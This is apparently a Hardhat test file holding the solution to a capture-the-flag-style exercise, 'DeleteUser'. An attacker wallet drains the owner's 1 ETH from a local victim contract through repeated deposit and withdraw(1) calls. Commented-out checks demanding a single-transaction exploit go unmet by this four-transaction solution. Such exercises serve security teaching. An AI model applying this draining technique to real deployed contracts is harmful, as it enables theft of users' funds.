const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DeleteUser";

describe(NAME, function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy();
    await victimContract.deposit({ value: ethers.utils.parseEther("1") });

    return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, attackerWallet;
    before(async function () {
      ({ victimContract, attackerWallet } = await loadFixture(setup));
    });

    it("conduct your attack here", async function () {
      const initialAttackerBalance = await ethers.provider.getBalance(
        attackerWallet.address
      );

      // The attacker deposits a small amount of ETH (0.0001 ETH) twice
      const tx1 = await victimContract
        .connect(attackerWallet)
        .deposit({ value: ethers.utils.parseEther("0.0001") });
      const tx2 = await victimContract
        .connect(attackerWallet)
        .deposit({ value: ethers.utils.parseEther("0.0001") });

      // The attacker withdraws the small amount of ETH, which removes the last user (attacker) from the array
      // and replaces it with the owner's deposit
      const tx3 = await victimContract.connect(attackerWallet).withdraw(1);

      // The attacker withdraws the owner's 1 ETH deposit
      const tx4 = await victimContract.connect(attackerWallet).withdraw(1);

      const receipt1 = await tx1.wait();
      const receipt2 = await tx2.wait();
      const receipt3 = await tx3.wait();
      const receipt4 = await tx4.wait();

      const gasUsed = receipt1.gasUsed
        .add(receipt2.gasUsed)
        .add(receipt3.gasUsed)
        .add(receipt4.gasUsed);
      const gasPrice = (await tx1.gasPrice).mul(gasUsed);

      const finalAttackerBalance = await ethers.provider.getBalance(
        attackerWallet.address
      );
      const expectedFinalAttackerBalance = initialAttackerBalance
        .add(ethers.utils.parseEther("1"))
        .sub(gasPrice);

      expect(finalAttackerBalance).to.be.equal(expectedFinalAttackerBalance);
    });

    // after(async function () {
    //   expect(
    //     await ethers.provider.getBalance(victimContract.address)
    //   ).to.be.equal(0);
    //   expect(
    //     await ethers.provider.getTransactionCount(attackerWallet.address)
    //   ).to.equal(1, "must exploit one transaction");
    // });

    // after(async function () {
    //   const contractBalance = await ethers.provider.getBalance(
    //     victimContract.address
    //   );
    //   console.log(
    //     "Contract balance after exploit:",
    //     ethers.utils.formatEther(contractBalance)
    //   );
    //   expect(contractBalance).to.be.equal(0);
    // });
  });
});
